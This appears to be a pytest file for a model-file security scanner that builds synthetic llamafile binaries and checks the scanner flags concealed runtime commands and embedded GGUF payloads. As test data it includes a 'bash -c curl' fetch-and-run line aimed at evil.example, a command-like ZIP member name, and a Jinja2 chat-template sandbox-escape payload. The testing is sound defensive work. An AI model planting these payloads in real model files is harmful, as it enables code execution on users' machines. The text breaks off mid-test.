from __future__ import annotations

import hashlib
import struct
import zipfile
from pathlib import Path
from typing import Any

import pytest

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.scanners import llamafile_scanner as llamafile_scanner_module
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
from modelaudit.scanners.llamafile_scanner import (
    LLAMAFILE_GGUF_AMBIGUOUS_PAYLOAD_REASON,
    LLAMAFILE_GGUF_ANALYSIS_INCOMPLETE_REASON,
    LLAMAFILE_GGUF_CANDIDATE_SCAN_LIMIT_REASON,
    LLAMAFILE_GGUF_HEADER_INCOMPLETE_REASON,
    LLAMAFILE_GGUF_HEADER_LIMIT_REASON,
    LLAMAFILE_GGUF_MAX_HEADER_CANDIDATES,
    LLAMAFILE_GGUF_ZIP_MEMBER_INCOMPLETE_REASON,
    LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON,
    LLAMAFILE_ROUTE_SCAN_BYTES,
    LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
    LLAMAFILE_RUNTIME_INTERPRETER_TOKEN_LIMIT_REASON,
    LLAMAFILE_RUNTIME_MAX_EVIDENCE,
    LLAMAFILE_RUNTIME_MAX_INTERPRETER_TOKENS,
    LLAMAFILE_RUNTIME_MAX_TRANSFER_TOKENS,
    LLAMAFILE_RUNTIME_PREVIEW_READ_REASON,
    LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON,
    LLAMAFILE_RUNTIME_STREAM_MAX_STRING_BYTES,
    LLAMAFILE_RUNTIME_STREAM_READ_REASON,
    LLAMAFILE_RUNTIME_STRING_SCAN_LIMIT_REASON,
    LLAMAFILE_RUNTIME_TRANSFER_OPTION_AMBIGUOUS_REASON,
    LLAMAFILE_RUNTIME_TRANSFER_TOKEN_LIMIT_REASON,
    LLAMAFILE_RUNTIME_UTF16_AMBIGUOUS_REASON,
    LlamafileScanner,
    find_structural_torch7_offset,
)


def _build_llamafile_blob(
    *,
    runtime_lines: list[str] | None = None,
    include_marker: bool = True,
    embedded_payload: bytes | None = None,
) -> bytes:
    header = b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56
    marker = b"llamafile runtime\n" if include_marker else b"generic runtime\n"
    runtime = ("\n".join(runtime_lines or ["--threads 4", "--ctx-size 2048"])).encode("utf-8")
    payload = (
        embedded_payload if embedded_payload is not None else b"\x00" * 8192 + b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    )
    return header + marker + runtime + b"\x00" * 256 + payload


def _write_sparse_runtime_gap_llamafile(
    path: Path,
    hidden_runtime: bytes,
    *,
    hidden_offset: int = 4 * 1024 * 1024,
) -> None:
    file_size = 12 * 1024 * 1024
    with path.open("wb") as handle:
        handle.write(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56)
        handle.seek(hidden_offset)
        handle.write(hidden_runtime + b"\n")
        handle.seek(6 * 1024 * 1024)
        handle.write(b"llamafile runtime\n")
        handle.seek(file_size - 1)
        handle.write(b"\x00")


def _build_gguf_string_metadata(entries: list[tuple[str, str]], *, version: int = 3) -> bytes:
    payload = bytearray(b"GGUF")
    payload.extend(struct.pack("<IQQ", version, 0, len(entries)))
    for key, value in entries:
        encoded_key = key.encode()
        encoded_value = value.encode()
        payload.extend(struct.pack("<Q", len(encoded_key)))
        payload.extend(encoded_key)
        payload.extend(struct.pack("<IQ", 8, len(encoded_value)))
        payload.extend(encoded_value)
    return bytes(payload)


def _build_mapped_executable_header(
    executable_format: str,
    mapped_size: int,
    *,
    elf_machine: int = 62,
) -> bytes:
    if executable_format == "elf":
        ident = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8
        header = ident + struct.pack("<HHIQQQIHHHHHH", 2, elf_machine, 1, 0, 64, 0, 0, 64, 56, 1, 0, 0, 0)
        segment = struct.pack("<IIQQQQQQ", 1, 5, 0, 0, 0, mapped_size, mapped_size, 4096)
        return header + segment

    if executable_format == "pe":
        optional_header_size = 0xF0
        section_table_offset = 0x80 + 24 + optional_header_size
        header = bytearray(section_table_offset + 40)
        header[:2] = b"MZ"
        struct.pack_into("<I", header, 0x3C, 0x80)
        header[0x80:0x84] = b"PE\x00\x00"
        struct.pack_into("<HHIIIHH", header, 0x84, 0x8664, 1, 0, 0, 0, optional_header_size, 0x2022)
        struct.pack_into("<H", header, 0x98, 0x20B)
        struct.pack_into("<I", header, 0x98 + 60, 512)
        header[section_table_offset : section_table_offset + 8] = b".text\x00\x00\x00"
        struct.pack_into("<II", header, section_table_offset + 16, mapped_size, 0)
        return bytes(header)

    if executable_format == "mach-o":
        header = b"\xcf\xfa\xed\xfe" + struct.pack("<iiIIIII", 0x01000007, 3, 2, 1, 72, 0, 0)
        segment = struct.pack(
            "<II16sQQQQiiII",
            0x19,
            72,
            b"__TEXT\x00" * 2,
            0,
            mapped_size,
            0,
            mapped_size,
            7,
            5,
            0,
            0,
        )
        return header + segment

    raise ValueError(f"Unsupported executable format: {executable_format}")


def _build_zero_size_mapping_header(executable_format: str, mapping_offset: int) -> bytes:
    header = bytearray(_build_mapped_executable_header(executable_format, 0))
    if executable_format == "elf":
        struct.pack_into("<Q", header, 64 + 8, mapping_offset)
    elif executable_format == "pe":
        section_table_offset = 0x80 + 24 + 0xF0
        struct.pack_into("<I", header, section_table_offset + 20, mapping_offset)
    elif executable_format == "mach-o":
        struct.pack_into("<Q", header, 32 + 40, mapping_offset)
    else:
        raise ValueError(f"Unsupported executable format: {executable_format}")
    return bytes(header)


def _write_sparse_mapped_llamafile(
    path: Path,
    executable_format: str,
    *,
    embedded_payload: bytes,
    mapped_runtime: bytes = b"benign mapped runtime",
    include_mapped_gguf_decoy: bool = False,
) -> int:
    mapped_size = 8 * 1024 * 1024
    payload_offset = 10 * 1024 * 1024
    with path.open("wb") as handle:
        handle.write(_build_mapped_executable_header(executable_format, mapped_size))
        if include_mapped_gguf_decoy:
            handle.seek(3 * 1024 * 1024)
            handle.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))
        handle.seek(4 * 1024 * 1024)
        handle.write(mapped_runtime + b"\n")
        handle.seek(6 * 1024 * 1024)
        handle.write(b"llamafile runtime\n")
        handle.seek(payload_offset)
        handle.write(embedded_payload)
    return payload_offset


def _write_ape_zip_llamafile(
    path: Path,
    embedded_payload: bytes,
    *,
    runtime: bytes = b"benign runtime",
    member_name: str = "weights/model.gguf",
    compression: int = zipfile.ZIP_STORED,
) -> None:
    with zipfile.ZipFile(path, "w", compression=compression) as archive:
        archive.writestr(member_name, embedded_payload)
    archive_bytes = path.read_bytes()
    stub_size = 8192
    stub = bytearray(stub_size)
    header = bytearray(_build_mapped_executable_header("pe", 4096))
    header[:6] = b"MZqFpD"
    stub[: len(header)] = header
    stub[1024 : 1024 + len(b"llamafile runtime\n")] = b"llamafile runtime\n"
    stub[2048 : 2048 + len(runtime)] = runtime
    embedded_elf = _build_mapped_executable_header("elf", 2048, elf_machine=183)
    stub[4096 : 4096 + len(embedded_elf)] = embedded_elf
    path.write_bytes(bytes(stub) + archive_bytes)


def test_llamafile_scanner_can_handle_detected_llamafile(tmp_path: Path) -> None:
    binary = tmp_path / "model.llamafile"
    binary.write_bytes(_build_llamafile_blob())

    assert LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_can_handle_detected_llamafile_with_misleading_suffix(tmp_path: Path) -> None:
    binary = tmp_path / "payload.jpg"
    binary.write_bytes(_build_llamafile_blob())

    assert LlamafileScanner.can_handle(str(binary))


@pytest.mark.parametrize("magic", [b"\xca\xfe\xba\xbf", b"\xbf\xba\xfe\xca"])
def test_llamafile_scanner_can_handle_fat64_macho_magic(tmp_path: Path, magic: bytes) -> None:
    binary = tmp_path / "fat64-payload.bin"
    binary.write_bytes(magic + b"\x00" * 128 + b"llamafile runtime")

    assert LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_does_not_route_fat64_macho_near_match(tmp_path: Path) -> None:
    binary = tmp_path / "fat64-near-match.bin"
    binary.write_bytes(b"\xca\xfe\xba\xc0" + b"\x00" * 128 + b"llamafile runtime")

    assert not LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_does_not_misclassify_generic_executable(tmp_path: Path) -> None:
    generic_exe = tmp_path / "tool.exe"
    generic_exe.write_bytes(b"MZ" + b"\x00" * 512 + b"normal executable")

    assert not LlamafileScanner.can_handle(str(generic_exe))


def test_llamafile_scanner_can_handle_middle_only_marker_in_exe(tmp_path: Path) -> None:
    binary = tmp_path / "middle-marker.exe"
    binary.write_bytes(
        b"MZ" + b"\x00" * 62 + b"A" * (2 * 1024 * 1024 + 64) + b"llamafile runtime" + b"B" * (2 * 1024 * 1024 + 64)
    )

    assert LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_can_handle_casefolded_middle_marker_in_exe(tmp_path: Path) -> None:
    binary = tmp_path / "middle-marker-uppercase.exe"
    binary.write_bytes(
        b"MZ" + b"\x00" * 62 + b"A" * (2 * 1024 * 1024 + 64) + b"LLAMAFILE runtime" + b"B" * (2 * 1024 * 1024 + 64)
    )

    assert LlamafileScanner.can_handle(str(binary))


def test_llamafile_scanner_can_handle_malicious_middle_marker_in_exe(tmp_path: Path) -> None:
    binary = tmp_path / "middle-marker-malicious.exe"
    payload = _build_llamafile_blob(
        runtime_lines=["bash -c curl http://evil.example/payload.sh"],
        include_marker=False,
    )
    binary.write_bytes(
        b"MZ"
        + b"\x00" * 62
        + b"A" * (2 * 1024 * 1024 + 64)
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
        + payload
    )

    result = LlamafileScanner().scan(str(binary))

    assert LlamafileScanner.can_handle(str(binary))
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_llamafile_scanner_flags_true_middle_runtime_strings(tmp_path: Path) -> None:
    binary = tmp_path / "middle-runtime.llamafile"
    binary.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"A" * (2 * 1024 * 1024)
        + b"bash -c curl http://evil.example/payload.sh"
        + b"B" * (1024 * 1024 - 512)
        + b"llamafile runtime\n"
        + b"B" * (2 * 1024 * 1024 + 64)
    )

    result = LlamafileScanner().scan(str(binary))

    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_llamafile_scanner_streams_runtime_between_preview_windows(tmp_path: Path) -> None:
    binary = tmp_path / "runtime-preview-gap.llamafile"
    _write_sparse_runtime_gap_llamafile(binary, b"bash -c curl http://evil.example/payload.sh")

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata.get("analysis_incomplete") is not True
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_llamafile_scanner_keeps_fully_streamed_benign_runtime_complete(tmp_path: Path) -> None:
    binary = tmp_path / "benign-runtime-preview-gap.llamafile"
    _write_sparse_runtime_gap_llamafile(binary, b"benign runtime text")

    result = LlamafileScanner().scan(str(binary))

    high_severity = [
        issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert high_severity == []
    assert result.success is True
    assert result.metadata.get("analysis_incomplete") is not True
    assert result.bytes_scanned <= binary.stat().st_size


@pytest.mark.parametrize(
    ("endpoint", "expect_finding"),
    [("evil.example:8080", True), ("localhost:8080", False)],
)
def test_llamafile_scanner_preserves_runtime_strings_across_stream_chunks(
    tmp_path: Path,
    endpoint: str,
    expect_finding: bool,
) -> None:
    binary = tmp_path / f"chunk-boundary-{endpoint.split(':')[0]}.llamafile"
    safe_prefix = b"%'18T connect(" + (b" " * 600)
    hidden_offset = (1024 * 1024) - len(safe_prefix)
    _write_sparse_runtime_gap_llamafile(
        binary,
        safe_prefix + endpoint.encode() + b")",
        hidden_offset=hidden_offset,
    )

    result = LlamafileScanner().scan(str(binary))

    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
    assert bool(runtime_checks) is expect_finding
    if expect_finding:
        assert runtime_checks[0].status == CheckStatus.FAILED
        assert runtime_checks[0].details["network_evidence"]
    else:
        assert result.success is True


@pytest.mark.parametrize("executable_format", ["elf", "pe", "mach-o"])
def test_llamafile_scanner_ignores_mapped_gguf_decoys_as_payload_boundaries(
    tmp_path: Path,
    executable_format: str,
) -> None:
    binary = tmp_path / f"mapped-gguf-decoy-{executable_format}.llamafile"
    expected_payload_offset = _write_sparse_mapped_llamafile(
        binary,
        executable_format,
        embedded_payload=b"GGUF" + struct.pack("<IQQ", 3, 0, 0),
        mapped_runtime=b"bash -c curl http://evil.example/payload.sh",
        include_mapped_gguf_decoy=True,
    )

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["embedded_payload_offset"] == expected_payload_offset
    assert result.metadata["embedded_payload_boundary_trusted"] is True
    assert any(
        check.name == "Llamafile Runtime String Analysis" and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_llamafile_scanner_honors_pe_size_of_headers_before_payload_boundary(tmp_path: Path) -> None:
    binary = tmp_path / "pe-header-gguf-decoy.llamafile"
    header = bytearray(_build_mapped_executable_header("pe", 0))
    struct.pack_into("<I", header, 0x98 + 60, 4096)
    expected_payload_offset = 5000
    blob = bytearray(6000)
    blob[: len(header)] = header
    blob[600:624] = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    blob[1000:1044] = b"bash -c curl http://evil.example/payload.sh"
    blob[2000:2018] = b"llamafile runtime\n"
    blob[expected_payload_offset : expected_payload_offset + 24] = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    binary.write_bytes(blob)

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["mapped_executable_end"] == 4096
    assert result.metadata["embedded_payload_offset"] == expected_payload_offset
    assert result.metadata["embedded_payload_boundary_trusted"] is True
    assert any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)


def test_llamafile_scanner_extends_ape_mapping_through_embedded_elf(tmp_path: Path) -> None:
    binary = tmp_path / "ape-embedded-elf.llamafile"
    pe_end = 3 * 1024 * 1024
    elf_base = pe_end + 8192
    elf_size = 2 * 1024 * 1024
    payload_offset = elf_base + elf_size + 4096
    with binary.open("wb") as handle:
        ape_header = bytearray(_build_mapped_executable_header("pe", pe_end))
        ape_header[:6] = b"MZqFpD"
        handle.write(ape_header)
        handle.seek(1024 * 1024)
        handle.write(b"llamafile runtime\n")
        handle.seek(elf_base)
        handle.write(_build_mapped_executable_header("elf", elf_size, elf_machine=183))
        handle.seek(elf_base + 1024 * 1024)
        handle.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))
        handle.write(b"\x00bash -c curl http://evil.example/payload.sh\x00")
        handle.seek(payload_offset)
        handle.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["mapped_executable_end"] == elf_base + elf_size
    assert result.metadata["embedded_payload_offset"] == payload_offset
    assert any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)


def test_llamafile_scanner_rejects_fat_macho_slice_overlapping_header(tmp_path: Path) -> None:
    binary = tmp_path / "invalid-fat-macho.llamafile"
    fat_header = b"\xca\xfe\xba\xbe" + struct.pack(">IiiIII", 1, 0x01000007, 3, 0, 4, 0)
    binary.write_bytes(
        fat_header
        + b"\x00llamafile runtime\x00"
        + b"GGUF"
        + struct.pack("<IQQ", 3, 0, 0)
        + b"\x00bash -c curl http://evil.example/payload.sh\x00"
    )

    result = LlamafileScanner().scan(str(binary))

    assert "mapped_executable_end" not in result.metadata
    assert result.metadata["embedded_payload_boundary_trusted"] is False
    assert any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)


def test_llamafile_scanner_parses_fat_macho_slice_before_trusting_payload_boundary(tmp_path: Path) -> None:
    binary = tmp_path / "inflated-fat-macho.llamafile"
    slice_offset = 4096
    declared_slice_size = 2 * 1024 * 1024
    mapped_size = 256
    payload_offset = slice_offset + 512
    decoy_offset = slice_offset + declared_slice_size + 1024
    malicious_payload = _build_gguf_string_metadata(
        [("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")]
    )
    fat_header = b"\xca\xfe\xba\xbe" + struct.pack(
        ">IiiIII",
        1,
        0x01000007,
        3,
        slice_offset,
        declared_slice_size,
        12,
    )
    with binary.open("wb") as handle:
        handle.write(fat_header)
        handle.seek(slice_offset)
        handle.write(_build_mapped_executable_header("mach-o", mapped_size))
        handle.seek(slice_offset + 128)
        handle.write(b"llamafile runtime\n")
        handle.seek(payload_offset)
        handle.write(malicious_payload)
        handle.seek(decoy_offset)
        handle.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["mapped_executable_end"] == slice_offset + mapped_size
    assert LLAMAFILE_GGUF_AMBIGUOUS_PAYLOAD_REASON in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Llamafile Embedded Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


@pytest.mark.parametrize("executable_format", ["elf", "pe", "mach-o"])
def test_llamafile_scanner_ignores_zero_size_mappings_when_finding_payloads(
    tmp_path: Path,
    executable_format: str,
) -> None:
    binary = tmp_path / f"zero-size-mapping-{executable_format}.llamafile"
    payload_offset = 9 * 1024 * 1024
    empty_mapping_offset = 10 * 1024 * 1024
    decoy_offset = 11 * 1024 * 1024
    malicious_payload = _build_gguf_string_metadata(
        [("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")]
    )
    with binary.open("wb") as handle:
        handle.write(_build_zero_size_mapping_header(executable_format, empty_mapping_offset))
        handle.seek(6 * 1024 * 1024)
        handle.write(b"llamafile runtime\n")
        handle.seek(payload_offset)
        handle.write(malicious_payload)
        handle.seek(decoy_offset)
        handle.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["mapped_executable_end"] < payload_offset
    assert LLAMAFILE_GGUF_AMBIGUOUS_PAYLOAD_REASON in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Llamafile Embedded Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


@pytest.mark.parametrize("executable_format", ["elf", "pe", "mach-o"])
def test_llamafile_scanner_scans_gguf_candidates_inside_mapped_executable_ranges(
    tmp_path: Path,
    executable_format: str,
) -> None:
    binary = tmp_path / f"mapped-payload-{executable_format}.llamafile"
    mapped_size = 10 * 1024 * 1024
    payload_offset = 9 * 1024 * 1024
    decoy_offset = 11 * 1024 * 1024
    malicious_payload = _build_gguf_string_metadata(
        [("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")]
    )
    with binary.open("wb") as handle:
        handle.write(_build_mapped_executable_header(executable_format, mapped_size))
        handle.seek(6 * 1024 * 1024)
        handle.write(b"llamafile runtime\n")
        handle.seek(payload_offset)
        handle.write(malicious_payload)
        handle.seek(decoy_offset)
        handle.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["mapped_executable_end"] == mapped_size
    assert result.metadata["embedded_payload_boundary_trusted"] is True
    assert any(
        check.name == "Llamafile Embedded Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_llamafile_scanner_selects_real_payload_after_post_mapping_gguf_decoy(tmp_path: Path) -> None:
    binary = tmp_path / "post-mapping-gguf-decoy.llamafile"
    mapped_size = 8 * 1024 * 1024
    decoy_offset = 9 * 1024 * 1024
    payload_offset = 10 * 1024 * 1024
    malicious_payload = _build_gguf_string_metadata(
        [("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")]
    )
    with binary.open("wb") as handle:
        handle.write(_build_mapped_executable_header("elf", mapped_size))
        handle.seek(6 * 1024 * 1024)
        handle.write(b"llamafile runtime\n")
        handle.seek(decoy_offset)
        handle.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))
        handle.seek(payload_offset)
        handle.write(malicious_payload)

    result = LlamafileScanner().scan(str(binary))

    assert LLAMAFILE_GGUF_AMBIGUOUS_PAYLOAD_REASON in result.metadata["scan_outcome_reasons"]
    assert result.metadata["embedded_payload_offset"] == payload_offset
    assert any(
        check.name == "Llamafile Embedded Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_llamafile_scanner_preserves_real_payload_finding_before_trailing_gguf_decoy(tmp_path: Path) -> None:
    binary = tmp_path / "post-payload-gguf-decoy.llamafile"
    mapped_size = 8 * 1024 * 1024
    payload_offset = 9 * 1024 * 1024
    decoy_offset = 10 * 1024 * 1024
    malicious_payload = _build_gguf_string_metadata(
        [("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")]
    )
    with binary.open("wb") as handle:
        handle.write(_build_mapped_executable_header("elf", mapped_size))
        handle.seek(6 * 1024 * 1024)
        handle.write(b"llamafile runtime\n")
        handle.seek(payload_offset)
        handle.write(malicious_payload)
        handle.seek(decoy_offset)
        handle.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["embedded_payload_candidate_offsets"] == [payload_offset, decoy_offset]
    assert LLAMAFILE_GGUF_AMBIGUOUS_PAYLOAD_REASON in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Llamafile Embedded Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_llamafile_multiple_benign_gguf_candidates_are_inconclusive_and_not_cached(tmp_path: Path) -> None:
    binary = tmp_path / "ambiguous-gguf.llamafile"
    candidate = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    binary.write_bytes(_build_llamafile_blob(embedded_payload=candidate + candidate))

    direct = LlamafileScanner().scan(str(binary))

    assert direct.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert LLAMAFILE_GGUF_AMBIGUOUS_PAYLOAD_REASON in direct.metadata["scan_outcome_reasons"]
    checks = [check for check in direct.checks if check.name == "Llamafile Embedded Payload Disambiguation"]
    assert len(checks) == 1
    assert checks[0].message == "Multiple plausible embedded GGUF payload boundaries were found"

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    assert aggregate.success is False
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "ambiguous-gguf-cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        assert cached_aggregate.success is False
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_llamafile_scanner_trusts_structural_zip_gguf_boundary_for_ape(tmp_path: Path) -> None:
    binary = tmp_path / "ape-zip-gguf.llamafile"
    _write_ape_zip_llamafile(
        binary,
        _build_gguf_string_metadata(
            [
                ("general.architecture", "llama"),
                ("general.description", "bash -c curl http://model-data.example/payload.sh"),
            ]
        ),
    )

    result = LlamafileScanner(config={"gguf_max_metadata_keys": 1}).scan(str(binary))

    assert result.success is False
    assert result.metadata["embedded_payload_boundary_trusted"] is True
    assert result.metadata["embedded_payload_boundary_source"] == "zip_member"
    assert LLAMAFILE_GGUF_ANALYSIS_INCOMPLETE_REASON in result.metadata["scan_outcome_reasons"]
    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)


def test_llamafile_scanner_stops_runtime_before_trusted_zip_member_header(tmp_path: Path) -> None:
    binary = tmp_path / "ape-command-like-zip-member.llamafile"
    _write_ape_zip_llamafile(
        binary,
        _build_gguf_string_metadata([("general.architecture", "llama")]),
        member_name="bash -c socket/model.gguf",
    )

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["embedded_payload_boundary_source"] == "zip_member"
    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)


def test_llamafile_scanner_fails_closed_for_compressed_zip_gguf_polyglot_coverage(tmp_path: Path) -> None:
    binary = tmp_path / "ape-compressed-gguf.llamafile"
    embedded = (
        b"GGUF"
        + struct.pack("<IQQ", 3, 0, 0)
        + (b"\x00" * 128)
        + _build_gguf_string_metadata([("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")])
    )
    _write_ape_zip_llamafile(
        binary,
        embedded,
        member_name="bash -c socket/model.gguf",
        compression=zipfile.ZIP_DEFLATED,
    )

    direct = LlamafileScanner().scan(str(binary))

    assert direct.success is False
    assert LLAMAFILE_GGUF_ZIP_MEMBER_INCOMPLETE_REASON in direct.metadata["scan_outcome_reasons"]
    checks = [check for check in direct.checks if check.name == "Llamafile Embedded ZIP GGUF Polyglot Coverage"]
    assert len(checks) == 1
    assert checks[0].message == "Embedded ZIP GGUF member could not be fully probed for trailing polyglot payloads"
    assert not any(check.name == "Llamafile Runtime String Analysis" for check in direct.checks)

    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
    assert aggregate.success is False
    assert determine_exit_code(aggregate) == 2

    cache_dir = tmp_path / "compressed-gguf-cache"
    reset_cache_manager()
    try:
        cached_aggregate = scan_model_directory_or_file(
            str(binary),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        assert cached_aggregate.success is False
        assert determine_exit_code(cached_aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_llamafile_scanner_scans_trailing_gguf_inside_stored_zip_member(tmp_path: Path) -> None:
    binary = tmp_path / "ape-stored-gguf-polyglot.llamafile"
    embedded = (
        b"GGUF"
        + struct.pack("<IQQ", 3, 0, 0)
        + (b"\x00" * 128)
        + _build_gguf_string_metadata([("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")])
    )
    _write_ape_zip_llamafile(binary, embedded)

    result = LlamafileScanner().scan(str(binary))

    assert any(
        check.name == "Llamafile Embedded Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_llamafile_scanner_does_not_trust_zip_boundary_inside_executable_mapping(tmp_path: Path) -> None:
    binary = tmp_path / "mapped-overlapping-zip.llamafile"
    with zipfile.ZipFile(binary, "w", compression=zipfile.ZIP_STORED) as archive:
        archive.writestr(
            "weights/model.gguf",
            b"GGUF"
            + struct.pack("<IQQ", 3, 0, 0)
            + (b"\x00" * (32 * 1024))
            + b"bash -c curl http://evil.example/payload.sh"
            + (b"\x00" * (40 * 1024)),
        )
    archive_bytes = binary.read_bytes()
    prefix_size = 4096
    prefix = bytearray(prefix_size)
    header = _build_mapped_executable_header("elf", 64 * 1024)
    prefix[: len(header)] = header
    prefix[1024 : 1024 + len(b"llamafile runtime\n")] = b"llamafile runtime\n"
    binary.write_bytes(bytes(prefix) + archive_bytes)

    result = LlamafileScanner().scan(str(binary))

    assert result.metadata["embedded_payload_boundary_trusted"] is False
    assert any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)


def test_llamafile_scanner_does_not_trust_ape_gguf_decoy_before_embedded_elf(tmp_path: Path) -> None:
    binary = tmp_path / "ape-early-gguf-decoy.llamafile"
    blob = bytearray(64 * 1024)
    outer_header = bytearray(_build_mapped_executable_header("pe", 4096))
    outer_header[:6] = b"MZqFpD"
    blob[: len(outer_header)] = outer_header
    blob[1024 : 1024 + len(b"llamafile runtime\n")] = b"llamafile runtime\n"
    fake_embedded_elf = _build_mapped_executable_header("elf", 2048)
    blob[6000 : 6000 + len(fake_embedded_elf)] = fake_embedded_elf
    blob[8192 : 8192 + 24] = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
    embedded_elf = _build_mapped_executable_header("elf", 32 * 1024, elf_machine=183)
    blob[16 * 1024 : 16 * 1024 + len(embedded_elf)] = embedded_elf
    malicious_runtime = b"bash -c curl http://evil.example/payload.sh"
    blob[24 * 1024 : 24 * 1024 + len(malicious_runtime)] = malicious_runtime
    binary.write_bytes(blob)

    result = LlamafileScanner(config={"llamafile_preview_bytes": 64}).scan(str(binary))

    assert result.metadata["embedded_payload_boundary_trusted"] is False
    assert any(
        check.name == "Llamafile Runtime String Analysis" and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


@pytest.mark.parametrize("executable_format", ["elf", "ape"])
def test_llamafile_scanner_accepts_large_raw_payload_after_trusted_mapping(
    tmp_path: Path,
    executable_format: str,
) -> None:
    binary = tmp_path / f"large-raw-{executable_format}.llamafile"
    embedded_payload = b"GGUF" + struct.pack("<IQQ", 3, 0, 0) + (b"\x00" * (2 * 1024 * 1024))
    _write_sparse_mapped_llamafile(
        binary,
        "pe" if executable_format == "ape" else executable_format,
        embedded_payload=embedded_payload,
    )
    if executable_format == "ape":
        with binary.open("r+b") as handle:
            handle.write(b"MZqFpD")
            handle.seek(8 * 1024 * 1024)
            handle.write(_build_mapped_executable_header("elf", 1024 * 1024, elf_machine=183))

    result = LlamafileScanner(config={"llamafile_payload_scan_bytes": 11 * 1024 * 1024}).scan(str(binary))

    assert result.success is True
    assert result.metadata["embedded_payload_boundary_trusted"] is True
    assert LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON not in result.metadata.get("scan_outcome_reasons", [])
    assert LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON not in result.metadata.get("scan_outcome_reasons", [])


def test_llamafile_scanner_propagates_trusted_embedded_gguf_inconclusive_state(tmp_path: Path) -> None:
    binary = tmp_path / "inconclusive-appended-gguf.llamafile"
    payload_offset = _write_sparse_mapped_llamafile(
        binary,
        "elf",
        embedded_payload=_build_gguf_string_metadata(
            [
                ("general.architecture", "llama"),
